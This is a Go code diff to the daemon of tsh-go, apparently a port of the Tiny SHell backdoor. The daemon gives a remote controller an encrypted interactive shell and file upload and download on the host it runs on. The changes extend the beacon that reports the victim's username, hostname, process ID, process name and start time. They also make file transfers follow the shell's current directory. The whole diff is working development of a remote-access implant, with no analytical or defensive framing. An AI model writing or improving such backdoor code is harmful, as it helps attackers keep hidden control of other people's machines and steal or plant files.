@@ -19,7 +19,10 @@ import (
 	"tsh-go/internal/utils"
 )
 
-var DebugFile *os.File
+var (
+	DebugFile *os.File
+	StartTime time.Time
+)
 
 func LogDebug(format string, a ...interface{}) {
 	if DebugFile != nil {
@@ -49,6 +52,7 @@ func Run() {
 	if err != nil {
 		// Ignore error
 	}
+	StartTime = time.Now()
 	LogDebug("Starting tshd...")
 
 	flagset := flag.NewFlagSet(filepath.Base(os.Args[0]), flag.ExitOnError)
@@ -78,6 +82,11 @@ func Run() {
 }
 
 func StartDaemon(host string, port int, secret string, delay int) {
+	// Initialize StartTime if not already set
+	if StartTime.IsZero() {
+		StartTime = time.Now()
+	}
+
 	if host == "" {
 		addr := fmt.Sprintf(":%d", port)
 		ln, err := pel.Listen(addr, secret, true)
@@ -115,7 +124,9 @@ func sendMetadata(layer *pel.PktEncLayer) {
 	if hostname == "" {
 		hostname = "?"
 	}
-	meta := fmt.Sprintf("%s@%s|%s/%s", username, hostname, runtime.GOOS, runtime.GOARCH)
+	pid := os.Getpid()
+	proc := filepath.Base(os.Args[0])
+	meta := fmt.Sprintf("%s@%s|%s/%s|%d|%s|%d", username, hostname, runtime.GOOS, runtime.GOARCH, pid, proc, StartTime.Unix())
 	layer.Write([]byte(meta))
 }
 
@@ -134,9 +145,9 @@ func handleGeneric(layer *pel.PktEncLayer) {
 	}
 	switch buffer[0] {
 	case constants.GetFile:
-		handleGetFile(layer, nil)
+		handleGetFile(layer, nil, "")
 	case constants.PutFile:
-		handlePutFile(layer, nil)
+		handlePutFile(layer, nil, "")
 	case constants.RunShell:
 		handleRunShell(layer)
 	case constants.Terminate:
@@ -144,7 +155,7 @@ func handleGeneric(layer *pel.PktEncLayer) {
 	}
 }
 
-func handleGetFile(layer *pel.PktEncLayer, initialData []byte) {
+func handleGetFile(layer *pel.PktEncLayer, initialData []byte, cwd string) {
 	LogDebug("handleGetFile: Started")
 	var filename string
 	if len(initialData) > 0 {
@@ -160,6 +171,10 @@ func handleGetFile(layer *pel.PktEncLayer, initialData []byte) {
 		}
 		filename = string(buffer[:n])
 		LogDebug("handleGetFile: Read filename: %s", filename)
+	}
+
+	if cwd != "" && !filepath.IsAbs(filename) {
+		filename = filepath.Join(cwd, filename)
 	}
 
 	f, err := os.Open(filename)
@@ -197,7 +212,7 @@ func handleGetFile(layer *pel.PktEncLayer, initialData []byte) {
 	LogDebug("handleGetFile: Completed")
 }
 
-func handlePutFile(layer *pel.PktEncLayer, initialData []byte) {
+func handlePutFile(layer *pel.PktEncLayer, initialData []byte, cwd string) {
 	LogDebug("handlePutFile: Started")
 	var filename string
 	if len(initialData) > 0 {
@@ -213,6 +228,10 @@ func handlePutFile(layer *pel.PktEncLayer, initialData []byte) {
 		}
 		filename = filepath.FromSlash(string(buffer[:n]))
 		LogDebug("handlePutFile: Read filename: %s", filename)
+	}
+
+	if cwd != "" && !filepath.IsAbs(filename) {
+		filename = filepath.Join(cwd, filename)
 	}
 
 	f, err := os.OpenFile(filename, os.O_CREATE|os.O_RDWR, 0644)
@@ -320,10 +339,12 @@ func handleRunShell(layer *pel.PktEncLayer) {
 					switch opcode {
 					case constants.GetFile:
 						LogDebug("handleRunShell: Switching to handleGetFile")
-						handleGetFile(layer, extra)
+						cwd := getCwd(tp.GetPID())
+						handleGetFile(layer, extra, cwd)
 					case constants.PutFile:
 						LogDebug("handleRunShell: Switching to handlePutFile")
-						handlePutFile(layer, extra)
+						cwd := getCwd(tp.GetPID())
+						handlePutFile(layer, extra, cwd)
 					case constants.Terminate:
 						LogDebug("handleRunShell: Received Terminate")
 						os.Exit(0)
@@ -352,4 +373,17 @@ func handleRunShell(layer *pel.PktEncLayer) {
 		}
 	}()
 	utils.CopyBuffer(layer, tp.StdOut(), buffer2)
+}
+
+func getCwd(pid int) string {
+	if pid <= 0 {
+		return ""
+	}
+	if runtime.GOOS == "linux" {
+		cwd, err := os.Readlink(fmt.Sprintf("/proc/%d/cwd", pid))
+		if err == nil {
+			return cwd
+		}
+	}
+	return ""
 }
